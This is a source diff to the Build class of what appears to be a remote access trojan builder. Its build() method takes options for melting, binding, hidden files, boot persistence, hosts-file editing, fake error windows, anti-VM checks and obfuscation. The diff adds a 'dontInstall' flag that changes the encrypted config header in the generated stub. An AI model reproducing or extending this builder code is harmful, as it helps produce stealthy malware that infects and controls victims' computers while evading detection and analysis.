@@ -54,7 +54,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm, boolean antivm) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm, boolean antivm) {
 		listener.start();
 
 		boolean obfuscate = zkm != null;
@@ -198,7 +198,14 @@ public class Build {
 
 				entry = new ZipEntry("config.dat");
 				outputStub.putNextEntry(entry);
-				byte[] keyIv = new byte[key.length + iv.getIV().length];
+				
+				int headerLength = key.length + iv.getIV().length;
+				
+				if (dontInstall) {
+					headerLength++;
+				}
+				
+				byte[] keyIv = new byte[headerLength];
 				System.arraycopy(key, 0, keyIv, 0, key.length);
 				System.arraycopy(iv.getIV(), 0, keyIv, 16, iv.getIV().length);
 				entry.setExtra(keyIv);
